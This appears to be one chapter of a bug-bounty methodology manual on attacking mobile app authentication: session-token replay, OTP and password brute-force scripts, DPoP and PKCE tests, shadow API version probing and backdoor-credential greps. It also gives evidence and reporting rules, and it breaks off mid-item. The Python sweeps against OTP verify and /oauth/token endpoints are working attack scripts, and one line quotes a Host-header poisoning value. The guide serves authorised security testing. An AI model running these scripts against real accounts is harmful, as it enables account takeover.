# D13 · Authentication, Session, OTP & Biometrics

> Everything that decides *who you are* to this app and *for how long*: login, registration, reset, SSO/OAuth/PKCE, JWT, session lifetime and revocation, device binding, refresh-token rotation, OTP, magic links, passkeys, biometric gates, step-up, recovery and deletion. This is the one domain where a mobile finding routinely reaches P1 on its own merits — `broken_authentication_and_session_management.authentication_bypass` is P1 by default — but only when you carry the primitive all the way to a server-issued session for an account you do not control. Stop at the client and the same work lands at P5 under `lack_of_binary_hardening.runtime_instrumentation_based`.

| | |
|---|---|
| **Phases** | P4 static (auth/session/crypto code review), P6 dynamic + API (proxy, replay, step-up matrix, OTP battery) |
| **Milestones** | M4, M6 |
| **VRT ceiling** | `broken_authentication_and_session_management.authentication_bypass` (**P1**); with SSO in the chain, `server_security_misconfiguration.oauth_misconfiguration.account_takeover` (**P2**); reset-link poisoning `sensitive_data_exposure.weak_password_reset_implementation.token_leakage_via_host_header_poisoning` (**P2**) |
| **Primary attacker model** | AM-01 remote no interaction (OTP/reset/session endpoints); AM-03 zero-permission local app (scheme squatting, SMS User Consent injection, notification listener); AM-11 physical unlocked (biometric/step-up matrix) |
| **Maps to** | MASVS-AUTH-1/2/3, MASVS-CRYPTO-2; MASTG-TEST-0326/0327/0328/0329/0330 (biometrics), MASTG-TEST-0247/0249 (secure screen lock), MASTG-TEST-0017 (Confirm Credentials), MASTG-TEST-0315 / MASTG-TEST-0005 / MASTG-TEST-0010 (notifications), MASTG-TEST-0320 (WebView residue), MASTG-TECH-0043 (method hooking); MASWE-0017/0019/0020/0021/0022/0023/0024/0025/0030/0037/0040; CWE-285, CWE-287, CWE-288, CWE-306, CWE-347, CWE-522, CWE-602, CWE-603, CWE-613, CWE-863; ATT&CK T1461, T1636.004, T1582, T1517, T1644, T1451, T1453, T1617, T1635, T1640, T1676, T1660; OWASP Mobile Top 10 2024 M3; API2:2023, API4:2023 |

## Why this domain pays

It pays because it is the only Android-adjacent domain whose findings are priced on outcome rather than on category. The entire mobile branch of the Bugcrowd VRT is pinned at P5 — pinning absent or defeatable, auto-backup, clipboard, tapjacking, root-detection absence, unencrypted internal storage — so a report whose headline is "the app stores a token in `shared_prefs`" is P5 by construction. The *same* token, replayed with `curl` from a host that has never run the app and returning another account's `/me`, is filed as `authentication_bypass` at P1. That reframing is the single highest-leverage move in mobile bug bounty, and it lives entirely in D13. Every local primitive from D07, D08, D09, D10, D11 and D14 terminates here or terminates nowhere.

It also pays because the mobile client is usually the *weaker* client. The corpus is unambiguous and repetitive on this point: lockout implemented on the web login form and not on the OAuth/token endpoint the app uses (H1 #160109 — an account already locked on the website still logged in through the app's endpoint); a verify endpoint capped at three attempts fronted by a resend endpoint with a 30-second cooldown and no cap, giving 8,640 attempts a day against a 10,000-value keyspace (H1 #205000, High 7.5); MFA enforced at the end of the primary login handler and absent from the mobile/API login handler that also mints a session. The bug-hunting corpus states it structurally: a mobile app's hardcoded backend calls are frequently an *older* API version than the web app uses, with weaker auth, weaker rate limits and more field exposure — and the weakened control, not the version difference, is the finding.

Be honest about the parts that are graveyard. Session-not-invalidated-on-logout is P4 at best and P5 server-side-only; excessive JWT lifetime, weak JWT algorithm, JWT PII, concurrent logins, no account lockout and "no 2FA implementation" are all P5; HackerOne's Core Ineligible list covers "most issues related to rate limiting"; Reddit, Grab and HackenProof all exclude bare rate-limit findings; Google's Mobile VRP excludes secondary lockscreen bypasses outright, and Bugcrowd prices a bypass that needs root/Frida with no other weakness at P5. A biometric-bypass report that shows the prompt skipped but never shows what the gate released is worth nothing — Shopify's accepted biometric bypass (H1 #637194) paid $500, while Nextcloud's passcode bypasses paid $0. The exception, and the reason this chapter is long: **the bypass plus the missing `CryptoObject` plus the released secret plus the server accepting that secret is a different report entirely**, and that chain is Critical.

## The crux question

**Does anything the server checks actually depend on the user having authenticated — or is every gate in this app a boolean the client computes, a header the client echoes, and a token the client can hand to `curl`?**

## Triage order

1. **Replay the live session token from `curl`, off-device, with no app-specific headers.** Two minutes, and it decides whether the rest of the engagement is scripted or hand-driven. A "device-bound" token that answers from your laptop demotes the vendor's headline control to nothing and converts every D11 storage finding into P1.
2. **Enumerate every code path that mints a session** (password login, SSO callback, mobile/API login, token exchange, remember-me, reset auto-login, email-change confirmation, account-link). MFA is checked in one handler; another always forgets.
3. **The OTP verify endpoint, measured not assumed.** Threshold, keyspace, resend budget, replay, binding. It is the commonest mobile primary auth and the commonest Critical.
4. **The step-up matrix on an unlocked device** — email, phone, password, 2FA method, recovery, trusted device, payee, deletion. Any row that passes converts temporary access into permanent account control.
5. **PKCE enforcement and the custom-scheme redirect.** A public client whose scheme any app can claim, redeeming codes without a `code_verifier`, is AM-03 account takeover.
6. **Session invalidation across logout, password change, email change and grant revocation** — and re-test the grant revocation 20+ hours later, which is where Reddit's Critical lived.
7. **The biometric call site**: is there a `CryptoObject`, and does the callback ever read it? Everything else about biometrics is downstream of that one line.
8. **Reset and magic-link token lifecycle** — leak, expiry, reuse, host-header poisoning, deep-link delivery.
9. **Refresh-token rotation and family revocation.** Long-lived refresh tokens in app storage are the mobile norm; without rotation the password change the victim performs is theatre.
10. **Registration and identity normalisation** (pre-hijacking classes, case collisions, unverified-email linking). Lowest dup rate, because scanners cannot reach it.

## Items

### D13-001 · The layer-ordering trap: a validation error does not prove you passed auth

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — kill gate protecting `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Every auth-bypass claim against every APK-derived endpoint |
| **Maps to** | `triage-validation` "THE LAYER-ORDERING TRAP"; `hunt-spa-api` steps 3–5 |

- **Test:** Many stacks run a global body parser, schema filter or input sanitiser *in front of* the auth middleware. A malformed body is rejected before auth is ever consulted, and the response is indistinguishable from "auth passed, validation failed". A `400 {"message":"field X is required"}` from an unauthenticated request is **not** evidence you reached business logic. Before that, establish a control: you cannot claim a route is unauthenticated until you know what correct rejection looks like on this stack.
- **How:**
```bash
# 0. CONTROL: an endpoint you expect to be gated, minimal well-formed body
curl -s -X POST https://api.target/api/v2/users \
  -H 'Content-Type: application/json' -d '{}' -i | head -5
# secure -> 401 {"error":"Missing or invalid authorization header"}

# 1. the trap: malformed body
curl -s -X POST https://api.target/api/v1/resource -d '{'
# 400 {"code":"ERR-INPUT-0001","message":"Invalid text. Only permitted characters are allowed"}  <- looks like a bypass

# 2. the disambiguator: minimal WELL-FORMED body, correct Content-Type
curl -s -X POST https://api.target/api/v1/resource \
  -H 'Content-Type: application/json' -d '{}'
# 401 {"code":"ERR-AUTH-0001","message":"Not authenticated. Please log in."}  <- auth layer is in front
```
- **Proof:** Only the well-formed request tells you where the auth layer sits. Error text about **input shape or character class** means you are talking to a parser. Error text naming a **domain field** (`accountId is required`) that *persists with a well-formed body* is real signal — and a body whose mandatory fields are named `is_admin`, `is_internal`, `requested_by`, `role_id` or `account_type` means authorisation is derived from client-supplied parameters, which is a Critical-class finding in its own right.
- **Escalation:** A confirmed unauthenticated route → D15 (BOLA sweep with the ids it returns). An `is_admin`-style mandatory field → D15 privilege escalation.
- **Ruled out when:** The minimal well-formed `{}` returns 401/403 with an auth-named error code, and that error code matches the control endpoint's. The route is gated; the 400 came from the parser. Record the two responses side by side — this is a defensible negative, not a skip. The same rule applies to WAF/CDN layers: an edge block is not an origin response.

### D13-002 · Body-diff rule and server-policy-vs-state on every auth bypass claim

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — evidence gate |
| **Attacker** | AM-01 |
| **Applies to** | Every "the gate opened" / "the 403 became a 200" claim in this chapter |
| **Maps to** | `bb-methodology` PART 4 (Body-Diff Rule, Server-Policy-vs-State) |

- **Test:** A bypass claim needs a response **body** differential, not a status code. A byte-identical 200 is not a bypass. Separately: a server-side policy that always denies is not a state oracle — establish whether the differentiator tracks *your input* or a *fixed deny-list*.
- **How:**
```bash
curl -s https://api.target/v1/me -H "Authorization: Bearer $TOKEN"      > /tmp/baseline.json
curl -s https://api.target/v1/me -H "Authorization: Bearer $TAMPERED"   > /tmp/bypass.json
diff /tmp/baseline.json /tmp/bypass.json ; wc -c /tmp/baseline.json /tmp/bypass.json
# and the negative control the other way round:
curl -s -o /dev/null -w '%{http_code}\n' https://api.target/v1/me       # no header at all
```
- **Proof:** A byte-level diff in the report showing the account's unique identity marker appearing only in the bypass response. If the two bodies differ by a request-id and a timestamp only, you have nothing. If a path returns 200 **both** with and without the bypass header, the path was never protected — that is a no-finding, not a bypass.
- **Escalation:** A real body diff on an auth boundary → D13-065 (a session was minted) → D15.
- **Ruled out when:** `diff` is empty, or the only differing bytes are correlation identifiers, or the unauthenticated control also returns the same body. Documented failure mode from the corpus: `Host: target.example:80@evil.example.com` returned 200 instead of a 403 baseline, and the bodies were byte-identical at 8,341 bytes — an ELB had normalised the Host and dropped the `@evil` portion.

### D13-003 · Marker discipline when proving cross-account or pre-auth reach

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — evidence gate |
| **Attacker** | AM-05 |
| **Applies to** | Every two-account auth proof: pre-hijacking, IDOR on sessions, OTP-for-another-user, account merge |
| **Maps to** | `bb-methodology` PART 4 (Marker Discipline); `security-arsenal` operator notes |

- **Test:** The "victim" account must carry a marker that cannot occur naturally. Random alphanumeric, **8+ characters**, no English words, no protocol keywords. Never `test`, `marker`, `evil`, `attacker`, `payload`, `script`, `AAAA`, or your own domain. Before claiming the marker appeared in the attacker's response, **search the baseline (no-marker) response for the marker string** — this single check kills most false reflection reports.
- **How:**
```bash
MARK="cpmark987abc"            # 8+ chars, not a word
# set it on account B (display name / address line / note field)
curl -s -X PATCH https://api.target/v1/me -H "Authorization: Bearer $B" \
  -H 'Content-Type: application/json' -d "{\"display_name\":\"$MARK\"}"
# baseline: does A's own response already contain it?
curl -s https://api.target/v1/me -H "Authorization: Bearer $A" | grep -c "$MARK"   # MUST be 0
# then the claim
curl -s https://api.target/v1/sessions -H "Authorization: Bearer $A" | grep -o "$MARK"
```
- **Proof:** Marker count 0 in the baseline, ≥1 in the test response, with both commands and both outputs in the report.
- **Escalation:** A confirmed cross-account marker on a session/device/2FA object → `broken_access_control.idor.*` at the tier the object's sensitivity supports.
- **Ruled out when:** The marker appears in the baseline too (collision or shared-tenant echo), or the "victim" account is one you also control through the same identity and the API is returning your own linked record. Provision A2 as a genuinely separate account at Gate 1 — an engagement with one account cannot test this class at all.

### D13-004 · Statistical-sample rule for throttle, race and timing claims

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — evidence gate for `server_security_misconfiguration.no_rate_limiting_on_form.*` (P4) and race findings |
| **Attacker** | AM-01 |
| **Applies to** | OTP throttle absence, login lockout absence, OTP-validate races, user-enumeration timing |
| **Maps to** | `bb-methodology` PART 4; `hunt-mfa-bypass` FP traps ("No rate limit because the first 6 attempts went through"; TOTP uniformity) |

- **Test:** Single outliers are not signal. For timing, a minimum of **n ≥ 10 interleaved trials per group**, randomised order, not back-to-back; a signal requires the suspect group's mean ≥ **2σ** above the control's. For rate limits, sample 100+ attempts before claiming absence, then determine whether the throttle is per-IP, per-session, per-account or per-username, and quantify the arithmetic.
- **How:**
```python
# interleaved timing sample, not back-to-back
import random, statistics, time, requests
groups = {"valid": "victim@example.com", "invalid": "nosuch8f3a@example.com"}
samples = {k: [] for k in groups}
order = [k for k in groups for _ in range(15)]; random.shuffle(order)
for k in order:
    t0 = time.perf_counter()
    requests.post("https://api.target/v1/login", json={"email": groups[k], "password": "x"}, timeout=10)
    samples[k].append((time.perf_counter() - t0) * 1000)
for k, v in samples.items():
    print(k, round(statistics.mean(v)), round(statistics.pstdev(v)), len(v))
```
- **Proof:** The distribution — mean, median, σ and n per group — not the outlier. For a throttle claim: the attempt count at which 429 first appears (or the count at which you stopped), plus which key the limiter uses, plus the derived time-to-exhaust for the observed keyspace.
- **Escalation:** A quantified exhaustible keyspace → D13-039 → `authentication_bypass` (P1) once you show the accepted code and the issued session.
- **Ruled out when:** Interleaved sampling collapses the groups (the corpus's worked retraction: `Administrator` at 1,527 ms on a single shot versus ~700 ms control; n=80 interleaved across 8 groups produced means of 685–716 ms with σ 25–74 ms). For a suspected OTP race, the FP twin is TOTP `window=1` — two parallel submissions spanning a 30-second boundary are two independently valid codes, not a race. RFC 6238 truncates an HMAC-SHA1 hash mod 10^6, so the output is uniform; three "pattern-like" samples prove nothing.

### D13-005 · Shell-loop ban on OTP and credential sweeps — count your results

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — methodology gate |
| **Attacker** | AM-01 |
| **Applies to** | Every automated sweep in this chapter that iterates more than five items |
| **Maps to** | `bb-methodology` PART 4 "Shell-Loop Ban" |

- **Test:** zsh array expansion fails **silently**. A `for x in "${arr[@]}"` loop can produce zero iterations with no error when the array was never populated, and the transcript still looks complete. The corpus reports losing ~50 probes' worth of verb-tampering testing to exactly this.
- **How:** Hardcoded loops of ≤5 items in shell are fine. Anything iterating a list, a file or a computed range goes to Python with `try/except` per iteration and explicit per-iteration logging, and the run ends with an assertion:
```python
import sys, requests
codes = [f"{i:04d}" for i in range(10000)]
seen = 0
with open("otp_bf.log", "w") as fh:
    for c in codes[:100]:                      # PoC discipline: 100 is enough evidence
        try:
            r = requests.post("https://api.target/v1/otp/verify",
                              json={"phone": PHONE, "otp": c}, timeout=10)
            fh.write(f"{c} {r.status_code} {len(r.content)}\n"); seen += 1
            if r.status_code == 200: print("ACCEPTED", c); break
        except Exception as e:
            fh.write(f"{c} ERR {e}\n"); seen += 1
assert seen == 100, f"loop ate {100 - seen} iterations"
```
- **Proof:** The result count matches the input count, stated in the report. A sweep whose line count is below its input count is not evidence of anything.
- **Escalation:** n/a — this is what makes D13-039/041/042 defensible.
- **Ruled out when:** Not applicable; this is a rule, not a test. The only acceptable negative is "the loop ran N times and produced N lines".

### D13-006 · Severity governance: run the pre-severity gate against the Critical claim

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — governs every P1/P2 claim in this chapter |
| **Attacker** | n/a |
| **Applies to** | Every Critical or High auth finding before it is written |
| **Maps to** | `triage-validation` PRE-SEVERITY GATE and 7-Question Gate; `bb-methodology` Phase 5 (Multi-Tool Reproduction Bar) |

- **Test:** Write the draft Critical title, then substitute the **Critical claim** — not the bug — into each question. (1) Have I validated the full chain to attacker-attainable impact, or only one primitive in the middle? (2) What does the attacker walk away with, in one concrete sentence? (3) Have I personally reproduced the full chain end-to-end at least twice? (4) Is there an inheritance gate, signature check, audience check or other validation still gating the chain? (5) Has the program rejected this severity class before? Then clear the reproduction bar: two independent tools with different HTTP stacks.
- **How:**
```bash
# Multi-tool bar: same claim, two stacks
curl -sS -i https://api.target/v1/me -H "Authorization: Bearer $FORGED" | head -20
python3 - <<'PY'
import requests
r = requests.get("https://api.target/v1/me", headers={"Authorization": "Bearer " + FORGED}, timeout=15)
print(r.status_code, r.text[:400])
PY
```
Reproduction commands in the report must be paste-into-shell ready; include the Python alternative when the curl form needs special flags.
- **Proof:** A documented pass/kill decision per finding, plus two independent reproductions attached to every Critical/High.
- **Escalation:** n/a.
- **Ruled out when:** The gate kills the Critical but not the finding. The corpus's worked failure is exactly this chapter's material: a JWT `alg:none` was labelled Critical on a confirmed signature-bypass primitive at the audience-validation layer, but the issuer-trust check still rejected unsigned tokens, the ATO chain never completed, and the finding was retracted. File it as "primitive present" at the lower tier instead. Kill-fast rules: five minutes to write the exact HTTP request or move on; more than two simultaneous preconditions = kill; 30+ minutes with no reproducible PoC = kill.

### D13-007 · Retraction discipline — and not retracting a Critical the client patched

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | Every engagement, and specifically to live auth testing against a monitored target |
| **Maps to** | `triage-validation` RETRACTION DISCIPLINE; ENGAGEMENTS.md Engagement 02 (`mid-engagement-ir-detection`) |

- **Test:** Two opposite rules that are easy to confuse. When a claimed finding fails reproduction, document the retraction in the report appendix rather than silently dropping it. When a **confirmed** finding stops reproducing because the client patched mid-engagement, do **not** retract — the difference is whether you hold timestamped pre-patch evidence.
- **How:** Appendix entry:
```markdown
### Retracted: <finding name>
- **Original signal:** <what looked like a bug>
- **Disproving evidence:** <reproduction step + observation that disproves it>
- **Why it looked like a bug:** <marker collision / jitter / status-code-only confidence>
- **Retraction date:** <YYYY-MM-DD>
```
For the patched case, keep the finding and attach the pre-patch request/response with timestamps; in red-team mode the detection timeline is itself a deliverable.
- **Proof:** A retraction appendix in the submitted report, or timestamped pre-patch captures. If a finding stops reproducing 24h after submission, retract pre-emptively — a self-retraction reads as a researcher validating their own work; a triager retraction reads as noise, and self-retractions do not hit the same platform-tracked metric.
- **Escalation:** n/a.
- **Ruled out when:** Not applicable — a rule. "A clean 11-finding report with a retraction appendix is more trustworthy than a 13-finding report where 2 fall apart at triage."

### D13-008 · Evidence hygiene for credential-change findings: the five-screenshot pattern and the PII split

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — evidence gate |
| **Attacker** | n/a |
| **Applies to** | Password-change, email-change, phone-change, MFA-change and deletion findings |
| **Maps to** | `evidence-hygiene` §§2, 4, 5, 6, 7, 8 |

- **Test:** A state change needs pre-state, the bug, both post-states and the out-of-band side effect. Five captures, taken in one sitting, without reloading pages between them (reloads regenerate cookies and invalidate prior captures).
- **How:** (1) Pre-state verification — `verify_password("current") → true`. (2) **The bug itself** — the change succeeds with no `StepUpRequiredError`; the most important capture. (3) Post-state negative — `verify_password("old") → false`. (4) Post-state positive — `verify_password("new") → true`. (5) Inbox screenshot showing whether any notification email fired, which proves whether passive defence exists. Filenames `{finding-#}-step{n}-{description}.png`, referenced by filename in the body. Sanitise HAR exports:
```bash
jq '.log.entries |= map(
  (.request.headers  |= map(if .name|ascii_downcase|IN("cookie","authorization","x-csrf-token") then .value="<REDACTED>" else . end)) |
  (.response.headers |= map(if .name|ascii_downcase|IN("set-cookie") then .value="<REDACTED>" else . end)) |
  (.request.cookies  |= map(.value="<REDACTED>")) |
  (.response.cookies |= map(.value="<REDACTED>")))' in.har > out.sanitized.har
grep -i 'authorization\|"cookie"' out.sanitized.har | head -20     # verify
```
- **Proof:** Five numbered, cross-referenced images plus a sanitised HAR. **Mask:** session cookies, bearer tokens, CSRF tokens, the victim's real PII. **Leave visible:** trace and request ids (`x-request-id`, `x-datadog-trace-id`), Cloudflare bot-management cookies (`__cf_bm`, `_cfuvid`), analytics ids, your own attacker uid, and JSON key names — the triager needs those to correlate to logs and to see the object shape. Prefer not capturing secrets at all: hide the Burp request body panel, and for rate-limit demos show only the Results table columns.
- **Escalation:** n/a.
- **Ruled out when:** Not applicable. Post-submission, log out and back in to rotate the session and rotate the test account's password so any value that did appear is dead; keep unredacted originals locally for triager verification through the platform's private attachment system, never email.

### D13-009 · Chain-filing order for auth chains

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — submission mechanics |
| **Attacker** | n/a |
| **Applies to** | Any D13 finding built from two or more primitives (token leak + no revocation; OTP brute + no step-up; scheme squat + no PKCE) |
| **Maps to** | `bugcrowd-reporting` §5.1 chain cross-referencing; `hunt-ato` Path 7 |

- **Test:** File the primitives **first**, so their submission ids exist, then file the chain consumer, then backfill the cross-references into the primitives. One fix equals one bounty; a chain is a severity amplifier, not a merge request.
- **How:** Order for the canonical mobile chain: (1) token recoverable from app storage — file it; (2) token not invalidated on password change — file it; (3) the consumer: "persistent account takeover surviving the victim's own remediation", referencing (1) and (2) by id. Then open the severity-request paragraph as the first body section of (3):
```markdown
## Severity request — please review carefully before applying VRT default

The closest VRT category is "[chosen VRT]," which Bugcrowd defaults to **P[N]**.
**I am requesting evaluation at P[M] in chain with submissions XXXX and YYYY** because:
1. [impact axis — why this exceeds the VRT default's example]
2. [cite the program's own Focus Areas by exact name]
3. [comparable historical payouts for the same data class]
```
- **Proof:** Primitive ids present in the chain report and chain id backfilled into each primitive.
- **Escalation:** n/a.
- **Ruled out when:** Not applicable. Do not paste the whole chain narrative into every primitive, do not claim each primitive is independently P1, and do not ask for a single combined bounty. Pick the most specific **accurate** VRT node — never one that misrepresents the bug to obtain a higher default — then override Technical Severity separately.

### D13-010 · Does the "device-bound" token still work from curl?

| | |
|---|---|
| **Severity ceiling** | Critical (in combination with any token-leak primitive); Medium standalone |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when it enables takeover |
| **Attacker** | AM-01 (with a leaked token), AM-12 for the measurement itself |
| **Applies to** | All. Run this **before** anything else in D15 — it decides whether you test through the app or through a script |
| **Maps to** | API2:2023 Broken Authentication; RFC 9449 (what real sender-constraining looks like: `cnf`/`jkt`, `htm`/`htu`/`ath`/`jti`) |

- **Test:** Vendors routinely describe their tokens as device-bound because the *client* attaches a device id. A header the client echoes is not binding — you can echo it too. Genuine binding is cryptographic: a DPoP proof, mTLS, or a per-request HMAC over a key the server issued and the client cannot export.
- **How:**
```bash
# reproduce the app's live request minimally, from a host that has never run the app
curl -sS -i 'https://api.target/v2/me' -H "Authorization: Bearer $TOKEN"
# then add back, ONE AT A TIME, each header the OkHttp interceptor sets, to find which is enforced
curl -sS -o /dev/null -w '%{http_code}\n' 'https://api.target/v2/me' \
     -H "Authorization: Bearer $TOKEN" -H "X-Device-Id: $DEVID"
curl -sS -o /dev/null -w '%{http_code}\n' 'https://api.target/v2/me' \
     -H "Authorization: Bearer $TOKEN" -H "X-Device-Id: 00000000-0000-0000-0000-000000000000"
# read the interceptor to know what the app actually sends
grep -rn 'Interceptor\|addHeader("Authorization"\|addHeader("X-' jadx_out/sources | head -40
```
- **Proof:** HTTP 200 with the account's data from a host that has never run the app, with no device-specific header, or with the device header set to an arbitrary value. Capture the full response and the interceptor source side by side.
- **Escalation:** Everything. → D11/D07/D08/D09/D10 token-leak primitives all become P1 `authentication_bypass`; → D15 (the whole API sweep becomes scriptable).
- **Ruled out when:** The request fails off-device *and you have excluded the two artefacts that fake device binding*: (1) a stale bot-management cookie (`__cf_bm`) returns a uniform 401 on every endpoint while the app stays logged in — re-pull the jar and re-test; (2) duplicate `host` + `.host` rows from the WebView `Cookies` DB send the same cookie twice and yield 400s that read as server rejection — dedupe, preferring the exact-host row. Only after both are excluded, and only if the server is actually validating a proof-of-possession (D13-011), is "device-bound" a true negative. A failed `curl` replay alone is not evidence of binding.

### D13-011 · DPoP is declared — is the proof actually validated?

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) once a leaked token is shown portable |
| **Attacker** | AM-01 |
| **Applies to** | Apps implementing DPoP — increasingly common in fintech and open-banking clients |
| **Maps to** | RFC 9449 (required claims `htm`, `htu`, `iat`, `jti`, `ath`; `cnf`/`jkt` binding; server MUST track `jti` within the acceptance window); API2:2023 |

- **Test:** A server with the appearance of sender-constraining and none of the substance. Degrade the proof five ways and see which the server notices.
- **How:** With the captured request, in order: (1) drop the `DPoP` header entirely; (2) reuse a proof from a *different* endpoint (wrong `htu`) or a different method (wrong `htm`); (3) replay the identical proof twice — the same `jti` inside the acceptance window must be rejected; (4) omit `ath` (the base64url SHA-256 of the access token) when presenting to a resource server; (5) present the token with a proof signed by a key you generated, so the `cnf.jkt` thumbprint cannot match.
```bash
for case in nodpop wrong_htu wrong_htm replay_jti no_ath foreign_key; do
  printf '%-12s ' "$case"
  curl -s -o /dev/null -w '%{http_code}\n' https://api.target/v2/me \
    -H "Authorization: DPoP $TOKEN" $(build_proof "$case")
done
```
- **Proof:** A 200 on any degraded request, contrasted against the baseline 200 with a correct proof and a 401 on a wholly invalid token (which shows the endpoint authenticates at all).
- **Escalation:** → D13-010 (the token is portable after all) → any token-leak primitive becomes takeover.
- **Ruled out when:** Every degradation returns 401 with a DPoP-specific error, *including* the `jti` replay — replay rejection is the one most servers omit, so test it explicitly rather than inferring it from the others.

### D13-012 · Shadow API: the mobile app's backend calls are an older, weaker API version

| | |
|---|---|
| **Severity ceiling** | Critical (old version bypasses auth entirely); High (accepts payloads the current version validates); Medium (rate-limit or field-exposure regression) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the old path accepts no/expired/lower-privilege tokens; otherwise the node matching the weakened control |
| **Attacker** | AM-01 |
| **Applies to** | Any versioned API. This is the highest-value mobile→backend bridge in the corpus |
| **Maps to** | `hunt-shadow-api` Stages 1 & 3 + severity table; explicit chain from `apk-redteam-pipeline` |

- **Test:** Old API versions stay reachable without receiving the same fixes, and a mobile app's hardcoded endpoints are the number-one source of old-version routes. **The bug is the delta, not the version.**
- **How:**
```bash
for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
  curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
done
curl -s -H "X-API-Version: 1" https://$TARGET/api/users
curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/users
for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do
  curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
done
# and mine the app's own history: older APKs pin older hosts and older paths
```
Anything but 404 / connection-refused means live. Then diff **four** security-relevant behaviours between old and current for the *same operation*: auth strength (does v1 accept no token, an expired token, or a lower-privilege token that v2 rejects?), rate limiting (burst both; a missing 429 on v1 means throttling was never backported), input validation (same payload to both), field exposure (does v1 return internal ids or PII the current version redacted?).
- **Proof:** A security regression on the old path, demonstrated with the same request against both versions side by side, in the same transcript.
- **Escalation:** Auth-strength regression → `authentication_bypass` (P1); rate-limit regression on an OTP verify route → D13-039 → ATO; field-exposure regression → D15/D20.
- **Ruled out when:** Every probed version returns 404 or connection-refused, **or** the old version is live but behaves identically on all four axes. A version difference alone is Informational — say so and move on. Diff behaviourally, never by response shape: a static "this version is deprecated" 200 is not a finding.

### D13-013 · The mobile auth endpoint does not inherit the web login's lockout

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when you demonstrate login to an account the web has locked; `server_security_misconfiguration.no_rate_limiting_on_form.login` (P4) for the bare absence |
| **Attacker** | AM-01 |
| **Applies to** | All apps whose backend also serves a web login |
| **Maps to** | H1 #160109 (Instacart), #127202 (New Relic), #138101 (Pornhub, $5,000); `hunt-brute-force` Pattern 4 |

- **Test:** Rate limiting, CAPTCHA, device fingerprinting and account lockout are frequently implemented on the web login *form* and not on the OAuth/token endpoint the app uses. Two findings live here, and the second is far stronger than the first.
- **How:**
```bash
# find the app's own auth endpoint by proxying the app, then drive it directly
python3 - <<'PY'
import requests
pw = [l.strip() for l in open("top100.txt")]
hit = 0
for i, p in enumerate(pw, 1):
    r = requests.post("https://www.target.com/oauth/token",
                      data={"grant_type": "password", "username": "victim@example.com", "password": p},
                      timeout=15)
    print(i, r.status_code, len(r.content))
    hit += 1
    if r.status_code == 200: print("ACCEPTED", p); break
assert hit == i
PY
# THE STRONGER HALF: lock the account via the WEB form first, then log in via the APP endpoint
```
- **Proof:** 50+ consecutive attempts with no throttling and no lockout, *and* a 200 on the correct password for an account the web UI has already locked out. That second half is the finding; the first half alone is a rate-limit report.
- **Escalation:** → D15 as the victim; → D13-065 if the mobile path also skips MFA.
- **Ruled out when:** The app endpoint returns 429 or a lockout at the same threshold as the web form **and** a web-locked account is also refused on the app path. Keep the attempt count and the exact threshold in the report either way — HackerOne's Core Ineligible list covers "most issues related to rate limiting", so the payable version of this item is always the locked-account bypass.

### D13-014 · ROPC (`grant_type=password`) or implicit grant on the token endpoint

| | |
|---|---|
| **Severity ceiling** | High (with absent throttling); Medium standalone |
| **VRT** | `server_security_misconfiguration.no_rate_limiting_on_form.login` (P4) standalone; `broken_authentication_and_session_management.authentication_bypass` (P1) once it yields a session for an account you do not control |
| **Attacker** | AM-01 |
| **Applies to** | All; common in older enterprise and telco apps |
| **Maps to** | draft-ietf-oauth-security-topics §2.4 ("The resource owner password credentials grant MUST NOT be used"), §2.1.2 (implicit grant SHOULD NOT be used); API2:2023 |

- **Test:** Some apps POST the user's username and password straight to `/oauth/token`. That puts the credential in the app process and makes credential stuffing trivially scriptable against an endpoint that no web-side protection covers.
- **How:**
```bash
grep -rn 'grant_type' jadx_out/sources | grep -iE 'password|client_credentials|implicit'
grep -rn 'response_type=token\|response_type=code' jadx_out/sources
curl -s -X POST https://auth.target/oauth/token \
  -d grant_type=password -d username=$U -d password=$P -d client_id=$CID -i | head -20
```
- **Proof:** A 200 with an access token from the ROPC request, then the consequence: the same endpoint accepting N password attempts with no throttle, quantified per D13-004.
- **Escalation:** → D13-013 (the mobile-only weaker path) → D15.
- **Ruled out when:** The token endpoint rejects `grant_type=password` with `unsupported_grant_type`, and the authorize request uses `response_type=code` with PKCE rather than `response_type=token`. Note that finding a `client_secret` in the APK alongside ROPC is *not* the report — "OAuth client_secret in mobile app" is on the never-submit list as known and expected; PKCE non-enforcement (D13-031) is the reportable finding instead.

### D13-015 · Hardcoded backdoor credential or alternate authentication path in the login code

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | All; this is a server-side flaw discovered by client-side review, which is exactly why source review pays |
| **Maps to** | sec-88 "Hacking InsecureBankv2" (`devadmin` → `/devlogin`); YesWeHack Android recon guide, "Analysing custom authentication and authorisation logic" |

- **Test:** Read the login code path end to end for special-cased usernames, build-flavour branches, or a *second* HTTP client pointed at a different endpoint. The canonical shape routes one username to an alternate route that authenticates without a password.
- **How:**
```bash
grep -rnE '\.equals\("(admin|devadmin|test|debug|root|superuser|qa)"\)' jadx_out/sources/
grep -rnE '(devlogin|/internal|/debug|bypass|backdoor|skipAuth|BuildConfig\.DEBUG)' jadx_out/sources/
